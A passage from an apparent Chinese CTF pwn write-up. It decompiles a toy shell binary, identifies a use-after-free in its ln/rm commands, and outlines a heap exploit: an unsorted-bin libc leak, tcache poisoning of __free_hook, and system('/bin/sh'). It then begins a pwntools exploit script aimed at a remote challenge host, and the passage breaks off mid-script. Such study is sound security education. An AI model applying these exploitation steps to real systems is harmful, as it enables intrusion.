class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> k; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> ii; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> jj; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> kk; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> m; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> n; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> mm; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !parameter1[<span class=\"number\">0</span>] )                         <span class=\"comment\">// 如果参数1为空则进入</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;command is NULL!!!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;ls&quot;</span>) )              <span class=\"comment\">// 如果参数1是ls</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">79</span>; ++i )                 <span class=\"comment\">// 输入一个列表</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * i) == <span class=\"number\">1LL</span> )       <span class=\"comment\">// *(base+6*i)==1则输出</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s &quot;</span>, &amp;file_flag + <span class=\"number\">48</span> * i + <span class=\"number\">8</span>); <span class=\"comment\">// 输入base+48*i+8指向的内容</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">putchar</span>(<span class=\"string\">&#x27;\\n&#x27;</span>);                              <span class=\"comment\">// 输出&#x27;\\n&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;cat&quot;</span>) )             <span class=\"comment\">// cat指令</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( parameter2[<span class=\"number\">0</span>] )                        <span class=\"comment\">// 如果第二个参数有内容</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">79</span>; ++j )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * j + <span class=\"number\">8</span>) )<span class=\"comment\">// base+48*j+8处的内容与参数2相同</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * j) == <span class=\"number\">1LL</span> )   <span class=\"comment\">// base+6*j指向内容为1，否则说明no file</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"built_in\">puts</span>(file_data[<span class=\"number\">6</span> * j]);             <span class=\"comment\">// 输出base2+6*i处的qword</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">LABEL_223:</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;NO FILE&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_223;</span><br><span class=\"line\">    &#125;                                           <span class=\"comment\">// no file</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">  &#125;                                             <span class=\"comment\">// filename is null</span></span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;touch&quot;</span>) )           <span class=\"comment\">// touch指令</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( parameter2[<span class=\"number\">0</span>] )                        <span class=\"comment\">// 第二个参数有值</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( k = <span class=\"number\">0</span>; k &lt;= <span class=\"number\">79</span>; ++k )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*(&amp;file_flag + <span class=\"number\">6</span> * k) )           <span class=\"comment\">// 如果原本为空</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          *(&amp;file_flag + <span class=\"number\">6</span> * k) = <span class=\"number\">1LL</span>;          <span class=\"comment\">// 使*(base+6*k)=1,表示有文件</span></span><br><span class=\"line\">          file_data[<span class=\"number\">6</span> * k] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x208</span>uLL);</span><br><span class=\"line\">          read_buf(file_data[<span class=\"number\">6</span> * k], <span class=\"number\">0x208</span>uLL); <span class=\"comment\">// 读入文件内容</span></span><br><span class=\"line\">          <span class=\"built_in\">strcpy</span>(&amp;file_flag + <span class=\"number\">48</span> * k + <span class=\"number\">8</span>, parameter2);<span class=\"comment\">// 将参数2的内容(file name)复制到file_flag+48*k+8</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">LABEL_807:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Maximum number of files. Please delete the file.&quot;</span>);<span class=\"comment\">// 文件最多80个</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">LABEL_711:</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;file_name is NULL&quot;</span>);                  <span class=\"comment\">// 第二个参数是filename</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;cp&quot;</span>) )              <span class=\"comment\">// 复制</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] || !parameter3[<span class=\"number\">0</span>] )     <span class=\"comment\">// filename为空</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">8</span>) &amp;&amp; file_flag == <span class=\"number\">1LL</span> )<span class=\"comment\">// 第1个file存在且filename与参数2相同</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( m = <span class=\"number\">0</span>; m &lt;= <span class=\"number\">79</span>; ++m )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter3, &amp;file_flag + <span class=\"number\">48</span> * m + <span class=\"number\">8</span>) )<span class=\"comment\">// 存在一个filename与参数3相同</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">strncpy</span>(file_data[<span class=\"number\">6</span> * m], file_data[<span class=\"number\">0</span>], <span class=\"number\">0x208</span>uLL);<span class=\"comment\">// 复制文件内容，第1个到第m个</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( n = <span class=\"number\">0</span>; ; ++n )                      <span class=\"comment\">//没有同名的file,检查有没有空余位置,有则复制到新文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( n &gt; <span class=\"number\">79</span> )                           <span class=\"comment\">// 文件太多</span></span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_807;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*(&amp;file_flag + <span class=\"number\">6</span> * n) )</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      *(&amp;file_flag + <span class=\"number\">6</span> * n) = <span class=\"number\">1LL</span>;              <span class=\"comment\">// 写入标志位</span></span><br><span class=\"line\">      file_data[<span class=\"number\">6</span> * n] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x208</span>uLL);\t\t<span class=\"comment\">// 分配data的空间</span></span><br><span class=\"line\">      <span class=\"built_in\">strcpy</span>(&amp;file_flag + <span class=\"number\">48</span> * n + <span class=\"number\">8</span>, parameter3); <span class=\"comment\">// 复制第三个参数到filename</span></span><br><span class=\"line\">      <span class=\"built_in\">strncpy</span>(file_data[<span class=\"number\">6</span> * n], file_data[<span class=\"number\">0</span>], <span class=\"number\">0x208</span>uLL); <span class=\"comment\">// 复制data</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_840; \t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;gedit&quot;</span>) )\t\t\t<span class=\"comment\">// gedit指令</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] )\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( ii = <span class=\"number\">0</span>; ; ++ii )\t\t\t\t\t\t</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ii &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * ii + <span class=\"number\">8</span>) ) <span class=\"comment\">// 比较参数二和文件名</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * ii) == <span class=\"number\">1LL</span> )\t\t\t\t<span class=\"comment\">// 文件已经存在</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      read_buf(file_data[<span class=\"number\">6</span> * ii], <span class=\"number\">0x200</span>uLL);\t\t\t<span class=\"comment\">// 写入0x200byte的data</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;rm&quot;</span>) )\t\t\t\t<span class=\"comment\">// 删除</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] )\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( jj = <span class=\"number\">0</span>; ; ++jj )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( jj &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * jj + <span class=\"number\">8</span>) ) <span class=\"comment\">// 比较参数二和文件名</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * jj) == <span class=\"number\">1LL</span> ) <span class=\"comment\">// 文件已经存在</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(file_data[<span class=\"number\">6</span> * jj]); \t\t\t<span class=\"comment\">// free并赋0</span></span><br><span class=\"line\">      file_data[<span class=\"number\">6</span> * jj] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      *(&amp;file_flag + <span class=\"number\">6</span> * jj) = <span class=\"number\">0LL</span>;\t\t<span class=\"comment\">// 清空标志位</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;\t\t\t\t\t  <span class=\"comment\">// 文件名没管，不知道有无影响</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;ln&quot;</span>) )\t\t\t\t\t\t\t<span class=\"comment\">// ln指令</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] )\t\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !parameter3[<span class=\"number\">0</span>] )\t\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( kk = <span class=\"number\">0</span>; ; ++kk )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( kk &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * kk + <span class=\"number\">8</span>) )\t<span class=\"comment\">// 找参数二对应的文件名</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * kk) != <span class=\"number\">1LL</span> )\t\t\t\t<span class=\"comment\">// 标志位为0</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_840:</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;file:%s is not exist;&quot;</span>, parameter2);\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( mm = <span class=\"number\">0</span>; ; ++mm )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( mm &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_807;\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件太多了</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;file_flag + <span class=\"number\">6</span> * mm) )\t\t\t\t\t<span class=\"comment\">// 找到一个空位</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(&amp;file_flag + <span class=\"number\">48</span> * mm + <span class=\"number\">8</span>, parameter3);\t\t<span class=\"comment\">// 复制第三个参数到file name</span></span><br><span class=\"line\">  *(&amp;file_flag + <span class=\"number\">6</span> * mm) = <span class=\"number\">1LL</span>;\t\t\t\t\t<span class=\"comment\">// 标志位设1</span></span><br><span class=\"line\">  file_data[<span class=\"number\">6</span> * mm] = file_data[<span class=\"number\">6</span> * kk];\t\t<span class=\"comment\">// copy data,从p2到p3</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由上可以大概看出这个shell的功能：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls: 输出所有flag为1的filename</span><br><span class=\"line\">cat p2: 输出p2指定filename的filedata </span><br><span class=\"line\">touch p2: 创建p2指定filename的文件，并输入文件内容(最大0x208byte) </span><br><span class=\"line\">cp p2 p3: 将名为p2的file复制到名为p3的file中，若不存在名为p3的文件则新建，p2必须是第一个文件的文件名 </span><br><span class=\"line\">gedit p2: 修改名为p2的file的内容(最多0x200byte)</span><br><span class=\"line\">rm p2: 删除名为p2的file，对标志位和chunk指针赋0</span><br><span class=\"line\">ln p2 p3: 将名为p2的file的filedata复制到一个新的名为p3的file中 (复制chunk指针)</span><br><span class=\"line\"></span><br><span class=\"line\">filedata_base: 0xa0e8 qword[6*i] 一个0x208byte</span><br><span class=\"line\">fileflag_base: 0xa0c0 </span><br><span class=\"line\">fileflag_base+6*i: flag,==1表示文件存在，==0表示文件不存在</span><br><span class=\"line\">fileflag_base+48*i+8: filaname</span><br></pre></td></tr></table></figure>\n\n<p>可以看到存在UAF：ln可将同一个<code>chunk</code>指针挂载到多个<code>file</code>中，但<code>rm</code>删除是按照<code>filename</code>删除一个<code>file</code>，仍可通过其他<code>file</code>控制该<code>chunk</code>指针。</p>\n<p>如果这样的话首先利用<code>unsorted bin</code>泄露出堆指针和libcbase， 之后利用<code>UAF</code>走<code>tcache poison</code>劫持<code>free_hook</code>来<code>get shell</code>。</p>\n<p>本地还能用下<code>one_gadget</code>，远程估计只能通过<code>malloc_hook</code>用’LibcSearcher’搜<code>libc</code>，之后走<code>system(&quot;&quot;/bin/sh\\x00&quot;)</code>。</p>\n<p>本地exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;sh_v1.1&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;121.40.89.206&#x27;</span>,<span class=\"number\">34883</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span 